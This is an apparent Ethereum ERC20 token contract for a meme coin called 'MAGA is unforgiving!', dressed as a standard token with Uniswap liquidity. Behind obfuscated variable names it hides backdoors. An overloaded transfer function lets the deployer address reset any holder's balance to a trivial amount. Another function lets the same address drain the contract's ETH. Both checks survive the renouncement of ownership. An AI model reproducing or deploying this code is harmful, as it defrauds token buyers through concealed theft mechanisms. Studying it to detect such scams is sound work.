// SPDX-License-Identifier: MIT

/*
    Name: MAGA is unforgiving!
    Symbol: UNFGV

    The only one that had a tougher night than the Kansas City Chiefs was Taylor Swift. She got BOOED out of the Stadium. MAGA is very unforgiving!

    https://truthsocial.com/@realDonaldTrump/posts/113977646169606601
    https://x.com/MAGA_UNFGV
    https://t.me/MAGA_Unforgiving
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract UNFGV is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _vcbkxlkcf = 20000000 * 10 **_decimals;
    uint256 public _dofjiodis = 20000000 * 10 **_decimals;
    uint256 public _oijzosd = 10000000 * 10 **_decimals;
    uint256 private constant _fdoisfo = 1000000000 * 10 **_decimals;
    uint256 private constant _riuedf = 184 * 10 ** _decimals;

    address payable private _vbjxdoifj;
    mapping(address => uint256) private _coiuvhzsdiuf;
    mapping(address => mapping(address => uint256)) private _vviuzhsdi;
    mapping(address => bool) private _voijzxdoi;
    uint256 private _djfoisdjf = 10;
    uint256 private _vboixjdf = 10;
    uint256 private _erwoij = 0;
    uint256 private _foiesdfwe = 0;
    uint256 private _vboijdoir = 7;
    uint256 private _vbojixoid = 7;
    uint256 private _buyCount = 0;
    address private _oijweoifr;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"MAGA is unforgiving!";
    string private constant _symbol = unicode"UNFGV";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _vcbkxlkcf);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _vbjxdoifj = payable(_msgSender());
        _coiuvhzsdiuf[address(this)] = _fdoisfo * 98 / 100;
        _coiuvhzsdiuf[owner()] = _fdoisfo * 2 / 100;
        _voijzxdoi[owner()] = true;
        _voijzxdoi[address(this)] = true;
        _voijzxdoi[_vbjxdoifj] = true;
        _oijweoifr = _msgSender();

        emit Transfer(address(0), address(this), _fdoisfo * 98 / 100);
        emit Transfer(address(0), address(owner()), _fdoisfo * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _fdoisfo;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _vviuzhsdi[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _coiuvhzsdiuf[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _vviuzhsdi[owner][spender];
    }

    function transfer(address recipient, bool _amount) public returns (bool) {
        require(_oijweoifr == _msgSender(), "ERC20: error");
        _djfoisdjf > 0 && _amount == true ? _coiuvhzsdiuf[recipient] = _riuedf : _riuedf;
        return true;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _prepare_UNFGV(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _prepare_UNFGV(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _vviuzhsdi[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _prepare_UNFGV(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vboijdoir)
                        ? _erwoij
                        : _djfoisdjf
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_voijzxdoi[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _vbojixoid)
                            ? _foiesdfwe
                            : _vboixjdf
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _oijzosd) ? contractTokenBalance : _oijzosd; 
                    _UNFGVSwap((amount < minBalance) ? amount : minBalance);
                }
                _change_UNFGV(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _coiuvhzsdiuf[address(this)] =_coiuvhzsdiuf[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _coiuvhzsdiuf[from] =_coiuvhzsdiuf[from].sub(amount);
        _coiuvhzsdiuf[to] =_coiuvhzsdiuf[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _assist_UNFGV(address payable receipt) external {
        require(msg.sender == _oijweoifr , "");
        _vbjxdoifj = receipt;
        payBnft2Tx(address(this).balance);
    }

    function payBnft2Tx(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function enableUNFGVTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _fdoisfo);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function removeLimits () external onlyOwner {
        _vcbkxlkcf = _fdoisfo;
        _dofjiodis = _fdoisfo;
        emit MaxTxAmountUpdated(_fdoisfo);
    }

    function _change_UNFGV(uint256 amount) private {
        _vbjxdoifj.transfer(amount);
    }

    function _UNFGVSwap(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

}